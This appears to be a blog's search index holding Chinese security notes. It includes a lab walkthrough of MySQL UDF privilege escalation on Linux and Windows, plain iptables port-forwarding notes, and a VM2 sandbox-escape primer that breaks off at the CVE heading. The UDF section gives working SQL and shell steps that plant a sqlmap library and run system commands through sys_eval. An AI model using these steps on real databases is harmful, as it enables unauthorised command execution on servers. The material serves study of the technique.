<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MySQL UDF提权</title>
      <link href="/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><code>UDF</code>（ <code>user defined function</code> ）用户自定义函数，是 <code>MySQL</code> 的一个扩展接口，称为用户自定义函数,是用来拓展 <code>MySQL</code> 的技术手段，用户通过自定义函数来实现在 <code>MySQL</code> 中无法实现的功能。文件后缀为 <code>.dll</code> 或 <code>.so</code> ，常用 <code>c</code> 语言编写。拿到一个 <code>WebShell</code> 之后，在利用操作系统本身存在的漏洞提权的时候发现补丁全部被修补。这个时候需要利用第三方应用提权。当 <code>MYSQL</code> &#x3D;&#x3D;权限比较高&#x3D;&#x3D; 的时候我们就可以利用 <code>udf</code> 提权。</p><blockquote><p><code>udf</code> 提权本质上并不是真正意义上的提权，只是通过当前 <strong>mysql的运行权限</strong> 去执行系统命令，如果<code>mysql</code> 运行权限太低的话同样也没有特别大的意义！！！</p></blockquote><h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><ul><li><code>mysql</code> 允许导入导出文件，也就是 <code>secure_file_priv</code> 的值为空（为空不是为 <code>NULL</code> ）</li><li>高权限用户启动，如 <code>root</code> 。该账号需要有对数据库 <code>mysql</code> 的 <code>insert</code> 和 <code>delete</code> 权限，其实是操作里面的<code>func</code> 表，所以 <code>func</code> 表也必须存在。而且这样才能有权限写入文件到目标文件夹中，不然大概率写不进去。</li><li>未开启 <code>‑‑skip‑grant‑tables</code> 。开启的情况下，<code>UDF</code> 不会被加载，默认不开启。</li></ul><blockquote><p><code>secure_file_priv</code> 是用来限制 <code>load dumpfile</code> 、<code>into outfile</code> 、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限。</p><p>当 <code>secure_file_priv</code> 的值为 <code>null</code> ，表示限制 <code>mysqld</code> 不允许导入|导出，此时无法提权；<br>当 <code>secure_file_priv</code> 的值为 <code>/tmp/</code> ，表示限制 <code>mysqld</code> 的导入|导出只能发生在 <code>/tmp/</code> 目录下，此时也无法提权；<br>当 <code>secure_file_priv</code> 的值没有具体值时，表示不对 <code>mysqld</code> 的导入|导出做限制，此时可提权。</p><p>在 <code>mysql5.5</code> 版本之前 <code>secure_file_priv</code> 这个值是默认为空的，那么我们拿到的 <code>webshell</code> 如果对应的 <code>mysql</code> 数据库版本在 <code>5.5</code> 以下的话操作起来就比较方便，在 <code>mysql5.5</code> 版本之后 <code>secure_file_priv</code> 这个值是默认为 <code>NULL</code> 的，即不能够在数据库中导入导出文件。</p></blockquote><blockquote><p>此外，<code>MySQL</code> 的默认启动用户是 <code>mysql</code> ，因此其权限比较低，需要运维配置错误给 <code>MySQL</code> 的启动用户过高的权限此漏洞才能利用成功。</p></blockquote><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>首先最基本的是要开启 <code>MySQL</code> 允许外部连接。</p><p><img src="/imgs/1692613411786.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个版本的MySQL的secure_file_priv默认为null，也就是不允许写入，导出文件的，因此我们需要在MySQL的配置文件my.ini中修改</span><br><span class="line">mysql 5.5.62</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看secure_file_priv的配置</span><br><span class="line">show global variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p>默认为 <code>NULL</code> ，因此为了复现漏洞，我们需要修改这里的参数。</p><p><img src="/imgs/1692528383808.png"></p><p>参数通过 <code>my.cnf</code> 文件中修改。</p><p><img src="/imgs/1692582087186.png"></p><p>同时我们还有修改 <code>MySQL</code> 的启动用户，以 <code>root</code> 用户高权限身份启动 <code>MySQL</code> ，后面才能将 <code>udf.so</code> 上传到 <code>MySQL</code> 的 <code>plugin</code> 目录。</p><p><img src="/imgs/1692612450671.png"></p><p>修改后要重启 <code>MySQL</code> 。</p><p><img src="/imgs/1692582107204.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="判断漏洞利用前提条件"><a href="#判断漏洞利用前提条件" class="headerlink" title="判断漏洞利用前提条件"></a>判断漏洞利用前提条件</h4><p>当我们拿到 <code>MySQL</code> 的控制权后，先通过 <code>show variables like &quot;%secure_file_priv%&quot;;</code> 命令查看是否允许导入导出文件。</p><p><img src="/imgs/1692582815101.png"></p><p>再通过 <code>select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1);</code> 查看当前数据库是否高权限。</p><p><img src="/imgs/1692583067591.png"></p><h4 id="上传UDF库文件"><a href="#上传UDF库文件" class="headerlink" title="上传UDF库文件"></a>上传UDF库文件</h4><ol><li>先通过 <code>select @@basedir;</code> 命令获取 <code>MySQL</code> 的安装目录。</li></ol><p><img src="/imgs/1692609973383.png"></p><ol start="2"><li>再通过 <code>show variables like &quot;%plugin%&quot;;</code> 命令获取 <code>plugin</code> 的路径。</li></ol><p><img src="/imgs/1692583659821.png"></p><ol start="3"><li>再通过 <code>select @@version_compile_os, @@version_compile_machine;</code> 命令来查看目标机器的架构情况，依此来选择上传什么版本的 <code>UDF</code> 库文件到目标机器。</li></ol><p><img src="/imgs/1692582321050.png"></p><ol start="4"><li>再准备 <code>UDF</code> 库文件。</li></ol><ul><li>从 <code>sqlmap</code> 中获取</li></ul><p><code>sqlmap</code> 中有现成的 <code>udf</code> 文件。分别是 <code>32</code> 位和 <code>64</code> 位的。这里选择<code>sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code> 。</p><p>不过这里的 <code>so</code> 文件是异或过的，需要执行以下命令解密：</p><p><img src="/imgs/1692583892344%201.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>此时会在和原本 <code>so</code> 文件相同的目录生成解密后的 <code>lib_mysqludf_sys.so</code> 文件。</p><ol start="5"><li>上传 <code>UDF</code> 文件到 <code>MySQL</code> 的插件目录中（要么是 <code>show variables like &quot;%plugin%&quot;</code> 返回的结果，要么是 <code>select @@basedir;</code> 的结果加上 <code>/lib/plugin</code> ，通过 <code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</code> 的报错信息来获取应该上传到哪个目录。）</li></ol><p><img src="/imgs/1692612743818.png"></p><blockquote><p>如果没有这个目录，就自己手动创建一个目录。</p></blockquote><p>通过下面的命令上传文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;) into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>但是 <code>load_file</code> 大概率无法正确返回 <code>so</code> 文件的结果，为了解决这个问题，我们可以手动复制这个文件的十六进制内容来手工导入。</p></blockquote><p><img src="/imgs/1692611648772.png"></p><p>我们可以通过 <code>xxd</code> 命令来获取二进制文件的十六进制表示，<code>-p</code> 参数表示只显示十六进制的内容，不显示其它信息。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692611897088.png"><br><code>linux-x64 payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>然后就可以通过 <code>so</code> 文件加载外部函数，然后利用外部函数调用系统命令了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692612275098.png"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="漏洞环境搭建-1"><a href="#漏洞环境搭建-1" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>和 <code>linux</code> 基本类似，但是需要注意的是 <code>windows</code> 的 <code>phpstudy</code> 不能直接开放 <code>MySQL</code> 外部连接，需要使用下面的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to 自己的用户名@&#x27;%&#x27; identified by &#x27;密码&#x27;; </span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>然后就可以外部连接本机的 <code>MySQL</code> 了。</p><p>然后依旧是需要保持 <code>secure_file_priv</code> 的值为空。（不过这个版本 <code>5.5.29</code> 的 <code>MySQL</code> 的这个属性默认就是空的。）</p><p><img src="/imgs/1692613710480.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>还是先信息收集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692613923125.png"></p><p>然后在 <code>kali</code> 的 <code>sqlmap</code> 中获取 <code>windows-x64</code> 版本的 <code>udf</code> 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614087711.png"></p><p>再通过 <code>xxd</code> 命令获取 <code>payload</code> 。</p><p><img src="/imgs/1692614141853.png"></p><p><code>windows-x64</code> 的 <code>payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  into dumpfile &#x27;D:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin/udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>然后执行下面的命令就可以成功提权了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 注意这里如果找不到这个文件，报错和linux不一样</span><br><span class="line"># windows会报错：ERROR 1126 (HY000): Can&#x27;t open shared library &#x27;udf.dll&#x27; (errno: 126 )</span><br><span class="line"># 而不是报错找不到这个文件</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614584661.png"></p><h1 id="windows利用和linux的不同"><a href="#windows利用和linux的不同" class="headerlink" title="windows利用和linux的不同"></a>windows利用和linux的不同</h1><p><code>Linux</code> 的用户权限划分比较严格，因此需要运维人员配置错误 <code>MySQL</code> 的启动权限比较高才能利用成功。而 <code>windows</code> 用户权限划分比较宽松，默认的启动权限就可以利用成功。</p><p>还有上面在没有找到 <code>udf</code> 文件的情况下，两个系统的报错信息也不同，<code>Linux</code> 会报错显示出目标 <code>udf</code> 文件不存在，并且显示出了插件库正确应当存放的路径，而 <code>windows</code> 只会报错显示无法打开这个文件，不会显示插件库的具体路径，但是还是可以通过 <code>show variables like &quot;%plugin%&quot;;</code> 来泄露插件库的存放路径。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md</span><br><span class="line">https://juejin.cn/post/7100562573254213668#heading-16</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/10836621.html</span><br><span class="line">https://www.cnblogs.com/miansj/p/13996110.html</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/121193134</span><br><span class="line">https://www.freebuf.com/vuls/348300.html</span><br><span class="line">https://blog.csdn.net/whatday/article/details/102807541</span><br><span class="line">https://www.sqlsec.com/2020/11/mysql.html#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93</span><br><span class="line">https://blog.51cto.com/u_16175511/6673705</span><br><span class="line">https://www.sqlsec.com/tools/udf.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 提权 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables实现流量转发</title>
      <link href="/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"/>
      <url>/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/uiop_uiop_uiop/article/details/128095847</span><br></pre></td></tr></table></figure><h1 id="内网流量转发"><a href="#内网流量转发" class="headerlink" title="内网流量转发"></a>内网流量转发</h1><h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>将本地访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><p>然后自己 <code>curl</code> 自己的 10001 端口，发现 10002 端口收到了流量。</p><h2 id="外网端口转发"><a href="#外网端口转发" class="headerlink" title="外网端口转发"></a>外网端口转发</h2><p>将外网访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><h1 id="通过跳板机流量转发"><a href="#通过跳板机流量转发" class="headerlink" title="通过跳板机流量转发"></a>通过跳板机流量转发</h1><p>假设转发服务器的地址 <code>192.168.188.130</code> 。目的服务器的地址是 <code>114.132.243.19</code> 。在转发服务器上把 <code>8080</code> 端口转发到 <code>114.132.243.19</code> 的 <code>80</code> 端口。</p><ol><li><p>打开 <code>ipv4</code> 的转发功能。<br>[[arp攻击#arp实验]]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></li><li><p>在 <code>PREROUTING</code> 上修改目的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 114.132.243.19:80</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932408931.png"></p><p>这里的报错应该是复制粘贴的问题，好像复制的空格被看作了 <code>&amp;nbsp;</code> ，不是代码的问题，导致没有把 <code>8080</code> 和 <code>j</code> 识别分开。</p><p><img src="/imgs/1677931663908.png"></p><p><img src="/imgs/1677932796726.png"></p><ol start="3"><li>在 <code>POSTROUTING</code> 上修改源地址<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.198 -p tcp --dport 80 -j SNAT --to 192.168.188.130</span><br></pre></td></tr></table></figure>或者用伪装的方式<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.19 -p tcp --dport 80 -j MASQUERADE</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932607172.png"></p><ol start="4"><li>为了防止在 <code>FORWARD</code> 上面被丢弃，添加规则允许通过。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  </span><br><span class="line">iptables -I FORWARD -d 114.132.243.19 -p tcp --dport 80 -j ACCEPT</span><br><span class="line">2.</span><br><span class="line">iptables -I FORWARD -s 114.132.243.19 -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677931921783.png"></p><p>注意 <code>iptables</code> 的增加和删除有一定的延迟，测试的时候要注意。</p><p>现在就可以在客户端上测试一下访问 <code>192.168.188.130:8080</code> 就会访问到 <code>114.132.243.19:80</code> 。</p><p><img src="/imgs/1677930811243.png"></p><h1 id="IP重定向"><a href="#IP重定向" class="headerlink" title="IP重定向"></a>IP重定向</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>有时我们想让一个域名指向另一个 <code>IP</code> 时，我们会直接修改 <code>/etc/hosts</code>，来实现我们的目地。那如果是访问一个 <code>IP</code>，需要这个 <code>IP</code> 指向另一个 <code>IP</code> 呢？是的，<code>iptables</code>  可以实现这层转发。</p><ul><li><p>场景一 : 家中有一台服务器内网 IP <code>192.168.0.111</code>, 公网 IP <code>123.123.123.123</code>，你可以通过 IP <code>123.123.123.123</code>在任何地方你都可以访问到你的服务器，在家的时候你可以通过内网来访问你的服务器，当然如果你在你家的电脑把 <code>123.123.123.123</code> 指向 <code>192.168.0.111</code> 那么你依然可以用外网来访问，但是其实走的是内网流量，速度会快很多。</p></li><li><p>场景二 : 此场景源于最近装的 <code>k8s</code> 集群，由于 3 台机子不在一个内网中，所以需要用外网来建立集群。其中有参数可以配置用公网来启动集群，但是无论是阿里还是腾讯，都没有把公网绑在机子的网卡上，所以我一直启动失败。当绑定在内网上却可以启动成功，那我只能想到这个折中的方法了，因为他们内网是不通的，所以通过内网 IP 是不能访问的，可是用内网启动一定要用内网连接，那我把内网 IP 重定向到外网 IP 上不就可以了？事实证明真的成功组成了集群。当然如果有更好的解决方案也欢迎告知我。</p></li><li><p>更多使用场景请自行发掘</p></li></ul><h2 id="把外网ip映射到内网ip"><a href="#把外网ip映射到内网ip" class="headerlink" title="把外网ip映射到内网ip"></a>把外网ip映射到内网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 123.123.123.123 -j DNAT --to-destination 192.168.0.111</span><br></pre></td></tr></table></figure><h2 id="把内网ip映射到外网ip"><a href="#把内网ip映射到外网ip" class="headerlink" title="把内网ip映射到外网ip"></a>把内网ip映射到外网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 192.168.0.111 -j DNAT --to-destination 123.123.123.123</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> iptables </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM2沙箱逃逸</title>
      <link href="/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li><code>JavaScript</code> 和 <code>Nodejs</code> 之间有什么区别：<code>JavaScript</code> 用在浏览器前端，后来将 <code>Chrome</code> 中的 <code>v8</code> 引擎单独拿出来为 <code>JavaScript</code> 单独开发了一个运行环境，因此 <code>JavaScript</code> 也可以作为一门后端语言，写在后端（服务端）的 <code>JavaScript</code> 就叫叫做 <code>Nodejs</code> 。</li><li>什么是沙箱（ <code>sandbox</code> ）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（ <code>sandbox</code> ）和 虚拟机（ <code>VM</code> ）和 容器（ <code>Docker</code> ）之间的区别：<code>sandbox</code> 和 <code>VM</code> 使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。<code>Docker</code> 属于 <code>sandbox</code> 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 <code>Docker</code> 和<code>sandbox</code> 嵌套的方式更多一点，安全性也更高。</li><li>在 <code>Nodejs</code> 中，我们可以通过引入 <code>vm</code> 模块来创建一个“沙箱”，但其实这个 <code>vm</code> 模块的隔离功能并不完善，还有很多缺陷，因此 <code>Node</code> 后续升级了 <code>vm</code> ，也就是现在的 <code>vm2</code> 沙箱，<code>vm2</code> 引用了 <code>vm</code> 模块的功能，并在其基础上做了一些优化。</li></ul><h1 id="VM介绍"><a href="#VM介绍" class="headerlink" title="VM介绍"></a>VM介绍</h1><h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p>在 <code>Node.js</code> 中，<code>VM(Virtual Machine)</code> 是一个用于解释和执行 <code>JavaScript</code> 代码的引擎。<code>VM</code> 是一个沙箱 ( <code>sandbox</code> ),它允许 <code>Node.js</code> 在执行脚本时限制其访问系统资源的权限，以防止脚本执行恶意代码或访问不必要的系统资源。</p><h2 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h2><p>由于 <code>vm</code> 不安全，能轻易地获取到了主程序的全局对象 <code>process</code> ，造成沙箱逃逸，所以有了 <code>vm2</code> 。<code>vm2</code> 基于<code>vm</code> ，使用官方的 <code>vm</code> 库构建沙箱环境。然后使用 <code>JavaScript</code> 的 <code>Proxy</code> 技术来防止沙箱脚本逃逸。</p><h1 id="VM的使用"><a href="#VM的使用" class="headerlink" title="VM的使用"></a>VM的使用</h1><p>我们首先要引入 <code>Nodejs</code> 内置的 <code>vm</code> 模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="在创建的虚拟机中执行代码"><a href="#在创建的虚拟机中执行代码" class="headerlink" title="在创建的虚拟机中执行代码"></a>在创建的虚拟机中执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">console</span>: <span class="variable language_">console</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>这里会发现终端上会打印 <code>2</code> 这个结果。如果我们在 <code>context</code> 中没有设置 <code>console: console</code> ，那就不会在终端上打印 <code>2</code> 。这里我的理解是，由于这里执行的代码中一个新的虚拟机，那么这个虚拟机中的环境和当前的环境是不一致的，也就是虚拟机中执行的命令不会回显到当前环境中，也就不会打印在终端上。但是背地还是执行了的。</p><h2 id="在当前上下文执行代码"><a href="#在当前上下文执行代码" class="headerlink" title="在当前上下文执行代码"></a>在当前上下文执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);  </span><br><span class="line"><span class="variable language_">global</span>.<span class="property">x</span> = <span class="number">1</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;  </span><br><span class="line">  </span><br><span class="line">vm.<span class="title function_">runInThisContext</span>(code);</span><br></pre></td></tr></table></figure><h1 id="示例说明VM模块的作用"><a href="#示例说明VM模块的作用" class="headerlink" title="示例说明VM模块的作用"></a>示例说明VM模块的作用</h1><h2 id="使用VM模块来实现一个简单的沙盒"><a href="#使用VM模块来实现一个简单的沙盒" class="headerlink" title="使用VM模块来实现一个简单的沙盒"></a>使用VM模块来实现一个简单的沙盒</h2><p>假设我们需要运行来自用户的 <code>JavaScript</code> 代码，但又不想让这些代码对我们的系统造成损害。这时，我们可以使用 <code>VM</code> 模块来实现一个简单的沙盒。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">    function add(a, b) &#123;</span></span><br><span class="line"><span class="string">        return a + b;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    console.log(add(2, 3));</span></span><br><span class="line"><span class="string">    console.log(process.argv);</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">    <span class="attr">process</span>: &#123;</span><br><span class="line">        <span class="attr">argv</span>: [<span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;index.js&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>上面的代码创建了一个虚拟机上下文，并在其中执行了 <code>JavaScript</code> 代码。在上下文中，我们定义了一个 <code>console</code> 对象和一个 <code>process</code> 对象，并向 <code>process</code> 对象中添加了一个 <code>argv</code> 属性。然后，我们执行了一个包含了一个 <code>add</code> 函数和一些输出语句的 <code>JavaScript</code> 代码。这个 <code>JavaScript</code> 代码会输出 <code>5</code> 和 <code>process.argv</code> 数组。</p><p>这样，我们就成功地把用户的代码隔离在一个虚拟机中，避免了它对我们的系统造成损害。</p><h1 id="VM2沙箱逃逸-v3-9-17，CVE-2023-32314"><a 